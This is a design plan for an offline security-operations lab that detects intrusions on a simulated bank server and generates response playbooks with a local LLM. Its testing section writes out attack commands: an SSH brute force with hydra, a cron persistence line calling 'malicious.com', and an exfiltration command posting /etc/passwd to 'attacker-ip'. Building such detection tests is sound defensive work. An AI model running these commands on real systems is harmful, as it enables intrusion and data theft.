
# üèó SYSTEM ARCHITECTURE (2 Machines)

### üñ• Machine 1 ‚Äî Target (Simulated Bank Server)

Role:

* Generates logs
* Runs services (SSH, web, database simulation)
* Produces EDR-style telemetry

### üñ• Machine 2 ‚Äî SOC Engine (Your AI System)

Role:

* Log collector
* Correlation engine
* UEBA engine
* Cache engine
* Playbook generator
* API server

---

# üîÅ FULL WORKFLOW EXPANDED (VERY DETAILED)

We now expand the 5 steps into a real operational pipeline.

---

# STEP 0 ‚Äî LOG COLLECTION (EDR + SIEM SIMULATION)

## On Machine 1 (Target)

Enable:

### 1Ô∏è‚É£ auditd (EDR-like telemetry)

Captures:

* execve (command execution)
* file changes
* privilege escalation
* network syscalls

Install:

```bash
sudo apt install auditd
```

Add rules:

```bash
-w /etc/passwd -p wa -k passwd_changes
-w /etc/sudoers -p wa -k sudo_mod
-a always,exit -F arch=b64 -S execve -k command_exec
```

---

### 2Ô∏è‚É£ Auth Logs

`/var/log/auth.log`

* SSH attempts
* sudo usage
* failed logins

---

### 3Ô∏è‚É£ System Logs

`/var/log/syslog`

---

## Log Shipping (No ELK)

Use:

* Python log forwarder
* Or rsyslog forwarding
* Or simple SCP pull every X seconds

Recommended minimal:

Machine 2 runs:

```bash
scp user@machine1:/var/log/auth.log .
scp user@machine1:/var/log/audit/audit.log .
```

Or build small Python socket receiver.

---

# STEP 1 ‚Äî DETECT INCIDENT

On Machine 2:

### 1Ô∏è‚É£ Log Normalization Layer

Convert all logs into unified JSON schema:

```json
{
  "timestamp": "...",
  "host": "server1",
  "user": "john",
  "event_type": "process_exec",
  "command": "curl malicious",
  "source_ip": "185.x.x.x",
  "severity": 0,
  "raw_log": "..."
}
```

This is CRITICAL.

Without normalization, correlation fails.

---

### 2Ô∏è‚É£ Feature Extraction (Behavioral Analytics)

Use:

* tsfresh ‚Üí extract time-based features
* PyOD ‚Üí anomaly detection

Example:

* Average SSH login frequency per user
* Command frequency baseline
* New process anomaly score

Output:

```json
{
  "anomaly_score": 0.87,
  "behavior_deviation": true
}
```

If score > threshold ‚Üí incident candidate

---

# STEP 2 ‚Äî COMPUTE PATTERN FINGERPRINT

Now we create a deterministic pattern ID.

You must build:

### Event Window Aggregator

Group events by:

* User
* Host
* Time window (e.g., 10 min)

Example window:

* 12 failed SSH
* 1 successful SSH
* 1 sudo command
* 1 curl execution

Now create pattern object:

```json
{
  "failed_ssh": 12,
  "successful_ssh": 1,
  "sudo_exec": true,
  "curl_exec": true
}
```

Now generate fingerprint:

```python
import hashlib
pattern_string = "failed_ssh>10|sudo_exec|curl_exec"
pattern_hash = hashlib.sha256(pattern_string.encode()).hexdigest()
```

This becomes:

```
pattern_id
```

---

# STEP 3 ‚Äî CHECK CACHE

Cache structure (Machine 2):

Use:

* Redis (recommended)
  OR
* SQLite (simpler)
  OR
* JSON file store (minimal)

Cache entry:

```json
{
  "pattern_id": "...",
  "playbook": [...],
  "validated": true,
  "severity": "high"
}
```

If pattern_id exists:
‚Üí Skip LLM
‚Üí Return stored playbook

This gives:

* Instant response
* Deterministic output
* Reduced compute

---

# STEP 4 ‚Äî IF MATCH ‚Üí RETURN PRE-APPROVED PLAYBOOK

Return structured steps:

```json
{
  "incident_type": "Credential Compromise",
  "severity": "High",
  "response_steps": [
    "Disable user account",
    "Block source IP via firewall",
    "Inspect /etc/sudoers",
    "Check cron jobs",
    "Collect forensic logs"
  ]
}
```

Also log response time.

---

# STEP 5 ‚Äî IF NO MATCH ‚Üí USE LLM

Use:

* Ollama (Mistral / Llama locally)
* HuggingFace model offline

Prompt structure (VERY IMPORTANT):

```
You are a Linux SOC analyst.
Given the following incident summary:

Failed SSH: 12
Successful SSH: 1
Sudo execution: Yes
Curl execution: Yes

Generate:
1. Incident classification
2. Severity
3. Step-by-step containment plan
4. Forensic preservation steps
5. Long-term remediation
```

Force structured JSON output.

---

# STEP 6 ‚Äî VALIDATION LAYER (CRITICAL)

Do not blindly trust LLM.

Add:

### 1Ô∏è‚É£ Rule-based validator

* Check if recommended steps include:

  * Account isolation
  * IP blocking
  * Log preservation

If missing critical containment ‚Üí flag low quality.

### 2Ô∏è‚É£ Containment Simulation Check

If disabling user stops attack chain ‚Üí valid.

---

# STEP 7 ‚Äî STORE IF APPROVED

If playbook passes validation:

Store in cache with:

* pattern_id
* timestamp
* success score
* response time

Now next time ‚Üí instant retrieval.

---

# ALERT GENERATION DESIGN

Alert triggers when:

* anomaly_score > threshold
  OR
* correlation rule triggered

Severity calculation:

```
severity = anomaly_score √ó impact_weight √ó asset_value
```

Example:
Banking DB server = high impact
Dev test server = medium impact

---

# TESTING TECHNIQUES (2 MACHINES)

Now critical part.

You test using controlled attack scripts.

---

## ATTACK SCENARIOS TO SIMULATE

### 1Ô∏è‚É£ SSH Brute Force

From Machine 2:

```bash
hydra -l test -P passwords.txt ssh://machine1
```

Expected detection:

* Multiple failed login
* Anomaly spike
* Pattern created

---

### 2Ô∏è‚É£ Successful Compromise + Sudo

Login successfully:

```bash
ssh user@machine1
sudo useradd hacker
```

Expected:

* Privilege escalation pattern

---

### 3Ô∏è‚É£ Persistence

```bash
echo "* * * * * curl malicious.com" >> /etc/crontab
```

Expected:

* File modification alert

---

### 4Ô∏è‚É£ Data Exfiltration Simulation

```bash
curl http://attacker-ip/upload -d @/etc/passwd
```

Expected:

* Suspicious outbound connection
* High severity

---

# EVALUATION METRICS

For each attack:

Measure:

1. Detection time
2. Correct classification
3. Playbook coverage score
4. Containment success
5. False positive rate

Create evaluation table:

| Scenario | Detected | Correct Severity | Playbook Valid | Cached Next Time |
| -------- | -------- | ---------------- | -------------- | ---------------- |

---

# COMPLETE TECH STACK

## Machine 1 (Target)

* Ubuntu
* auditd
* rsyslog
* SSH server

## Machine 2 (SOC Engine)

* Python 3.11
* FastAPI
* Redis (or SQLite)
* PyOD
* tsfresh
* Ollama
* hashlib
* multiprocessing
* cron scheduler

No ELK.
No external APIs.
Fully offline.

---

# FINAL PIPELINE SUMMARY

```
Logs ‚Üí Normalize ‚Üí Feature Extract ‚Üí Anomaly Score
       ‚Üì
Correlation Window
       ‚Üì
Pattern Fingerprint
       ‚Üì
Cache Lookup
       ‚Üì
(If Hit) ‚Üí Return Playbook
(If Miss) ‚Üí LLM ‚Üí Validate ‚Üí Store ‚Üí Return
```

---

# WHY THIS IS STRONG

‚úî Simulates SIEM + EDR
‚úî Offline
‚úî Deterministic when known
‚úî Adaptive when novel
‚úî Research-measurable
‚úî Scalable

